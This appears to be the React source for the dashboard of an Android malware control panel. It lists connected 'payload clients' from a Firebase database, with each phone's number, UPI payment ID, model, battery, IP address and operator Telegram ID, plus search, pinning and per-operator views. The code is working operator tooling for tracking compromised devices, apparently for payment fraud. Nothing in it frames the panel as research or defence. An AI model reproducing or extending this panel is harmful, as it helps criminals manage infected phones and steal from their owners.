import { useEffect, useState, useMemo } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove } from 'firebase/database';
import { Link } from 'wouter';
import { Search, Smartphone, Battery, BatteryWarning, Pin, PinOff, Activity, ChevronRight, Wifi } from 'lucide-react';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import { normalizeDevice, type NormalizedDevice } from '@/lib/normalizeDevice';

export function Dashboard() {
  const { isAdmin, userId } = useAuth();
  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());

  useEffect(() => {
    const clientsRef = ref(db, 'clients');
    const unsubscribe = onValue(clientsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const devicesList = Object.keys(data).map((key) =>
          normalizeDevice(key, data[key])
        );
        setDevices(devicesList);
      } else {
        setDevices([]);
      }
      setLoading(false);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (!userId) return;
    const pinsRef = ref(db, `config/pins/${userId}`);
    const unsubscribe = onValue(pinsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val() as Record<string, boolean>;
        setPinnedIds(new Set(Object.keys(data).filter((k) => data[k])));
      } else {
        setPinnedIds(new Set());
      }
    });
    return () => unsubscribe();
  }, [userId]);

  const togglePin = (deviceId: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${deviceId}`);
    if (pinnedIds.has(deviceId)) {
      remove(pinRef);
    } else {
      set(pinRef, true);
    }
  };

  const visibleDevices = useMemo(() => {
    if (isAdmin) return devices;
    // Non-admin sees ONLY their own devices (ownerTelegramId must match)
    return devices.filter((d) => d.ownerTelegramId === userId);
  }, [devices, isAdmin, userId]);

  const filteredDevices = useMemo(() => {
    const base = search
      ? visibleDevices.filter((d) => {
          const q = search.toLowerCase();
          return (
            d.phone.toLowerCase().includes(q) ||
            d.model.toLowerCase().includes(q) ||
            d.upi.toLowerCase().includes(q) ||
            d.id.toLowerCase().includes(q) ||
            (d.ip_address || '').includes(q)
          );
        })
      : visibleDevices;

    return [...base].sort((a, b) => {
      const aPinned = pinnedIds.has(a.id) ? 0 : 1;
      const bPinned = pinnedIds.has(b.id) ? 0 : 1;
      if (aPinned !== bPinned) return aPinned - bPinned;
      const aOnline = a.isOnline ? 0 : 1;
      const bOnline = b.isOnline ? 0 : 1;
      return aOnline - bOnline;
    });
  }, [visibleDevices, search, pinnedIds]);

  const getBatteryValue = (battery: string) => {
    return parseInt(battery.replace('%', ''), 10) || 0;
  };

  return (
    <Layout>
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 gap-4">
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-[#2d1b4e]">Dashboard</h1>
          <p className="text-[#6b5b7d] text-sm mt-1 flex items-center gap-2">
            <Activity className="w-4 h-4 text-[#7c3aed]" />
            <span>
              {filteredDevices.length} device{filteredDevices.length !== 1 ? 's' : ''}
              {pinnedIds.size > 0 && ` · ${pinnedIds.size} pinned`}
              {' · '}<span className="text-[#10b981]">{filteredDevices.filter(d => d.isOnline).length} online</span>
            </span>
          </p>
        </div>

        <div className="relative w-full md:w-80">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-[#6b5b7d]" />
          <input
            type="text"
            placeholder="Search phone, model, IP..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-white border border-[#d8c8f0] rounded-2xl py-2.5 pl-11 pr-4 text-sm text-[#2d1b4e] focus:outline-none focus:ring-2 focus:ring-[#7c3aed]/20 focus:border-[#7c3aed] transition-all placeholder:text-[#9ca3af]"
          />
        </div>
      </div>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {[1, 2, 3, 4, 5, 6].map((i) => (
            <div key={i} className="bg-[#ecdbfd] border border-[#d8c8f0] rounded-3xl h-44 animate-pulse" />
          ))}
        </div>
      ) : filteredDevices.length === 0 ? (
        <div className="flex flex-col items-center justify-center bg-[#ecdbfd] border border-[#d8c8f0] border-dashed rounded-3xl py-24 px-4 text-center">
          <div className="w-16 h-16 rounded-full bg-[#f5efff] flex items-center justify-center mb-4">
            <Smartphone className="w-8 h-8 text-[#6b5b7d]" />
          </div>
          <h3 className="text-lg font-medium text-[#2d1b4e] mb-1">No devices found</h3>
          <p className="text-sm text-[#6b5b7d] max-w-sm">
            {search
              ? 'Adjust your search query to find active devices.'
              : isAdmin
              ? 'Awaiting initial connection from payload clients.'
              : 'No devices are assigned to your account yet. Contact admin.'}
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both">
          {filteredDevices.map((device, i) => {
            const batteryNum = getBatteryValue(device.battery);
            const isPinned = pinnedIds.has(device.id);

            return (
              <Link
                key={device.id}
                href={`/device/${device.id}`}
                className={`group bg-[#ecdbfd] border rounded-3xl p-4 flex flex-col relative overflow-hidden transition-all hover:shadow-lg hover:shadow-purple-100 block ${
                  isPinned
                    ? 'border-[#7c3aed]'
                    : 'border-[#d8c8f0] hover:border-[#b8a0e0]'
                }`}
                style={{ animationDelay: `${i * 50}ms` }}
              >
                <div className={`absolute top-0 left-0 h-1 w-full transition-colors ${isPinned ? 'bg-[#7c3aed]' : device.isOnline ? 'bg-[#10b981]' : 'bg-[#d8c8f0] group-hover:bg-[#b8a0e0]'}`} />

                <div className="flex justify-between items-start mb-4 mt-1">
                  <div className="flex items-center gap-3">
                    <div className="bg-[#f5efff] rounded-2xl p-2.5 border border-[#d8c8f0]">
                      <Smartphone className="w-5 h-5 text-[#6b5b7d] group-hover:text-[#7c3aed] transition-colors" />
                    </div>
                    <div>
                      <div className="text-xs font-medium text-[#6b5b7d]">DEVICE {i.toString().padStart(3, '0')}</div>
                      <div className="font-semibold text-sm text-[#2d1b4e] truncate w-28" title={device.model}>
                        {device.model}
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center gap-1">
                    <button
                      onClick={(e) => togglePin(device.id, e)}
                      title={isPinned ? 'Unpin' : 'Pin to top'}
                      className={`p-2 rounded-full transition-all ${
                        isPinned
                          ? 'bg-[#7c3aed]/10 text-[#7c3aed] opacity-100'
                          : 'opacity-0 group-hover:opacity-100 text-[#6b5b7d] hover:text-[#7c3aed] hover:bg-[#f5efff]'
                      }`}
                    >
                      {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
                    </button>

                    <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold ${
                      device.isOnline
                        ? 'bg-[#10b981]/10 text-[#10b981]'
                        : 'bg-[#9ca3af]/20 text-[#6b5b7d]'
                    }`}>
                      <span className={`w-1.5 h-1.5 rounded-full ${device.isOnline ? 'bg-[#10b981] animate-pulse' : 'bg-[#9ca3af]'}`} />
                      {device.isOnline ? 'Online' : 'Offline'}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-y-3 gap-x-2 text-sm mt-auto">
                  <div className="flex flex-col">
                    <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Phone</span>
                    <span className="font-medium text-xs text-[#2d1b4e]">{device.phone || 'N/A'}</span>
                  </div>
                  <div className="flex flex-col">
                    {device.upi ? (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
                        <span className="font-medium text-xs text-[#7c3aed] truncate">{device.upi}</span>
                      </>
                    ) : device.androidV ? (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Android</span>
                        <span className="font-medium text-xs text-[#2d1b4e]">v{device.androidV}</span>
                      </>
                    ) : (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
                        <span className="font-medium text-xs text-[#9ca3af]">N/A</span>
                      </>
                    )}
                  </div>
                </div>

                <div className="mt-4 pt-3 border-t border-[#d8c8f0] flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {device.battery && (
                      <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
                        {batteryNum <= 20 ? (
                          <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
                        ) : (
                          <Battery className="w-3.5 h-3.5" />
                        )}
                        <span className={batteryNum <= 20 ? 'text-[#f59e0b]' : ''}>{device.battery}</span>
                      </div>
                    )}
                    {device.ip_address && (
                      <span className="text-[10px] font-medium text-[#6b5b7d] bg-[#f5efff] px-1.5 py-0.5 rounded-lg border border-[#d8c8f0] flex items-center gap-1">
                        <Wifi className="w-2.5 h-2.5" />
                        {device.ip_address.split('.').slice(0,2).join('.')}…
                      </span>
                    )}
                    {device.ownerTelegramId && isAdmin && (
                      <span className="text-[10px] font-medium text-[#6b5b7d] bg-[#f5efff] px-1.5 py-0.5 rounded-lg border border-[#d8c8f0]">
                        {device.ownerTelegramId.slice(0, 8)}…
                      </span>
                    )}
                  </div>
                  <ChevronRight className="w-4 h-4 text-[#6b5b7d] group-hover:text-[#7c3aed] transition-colors group-hover:translate-x-1" />
                </div>
              </Link>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
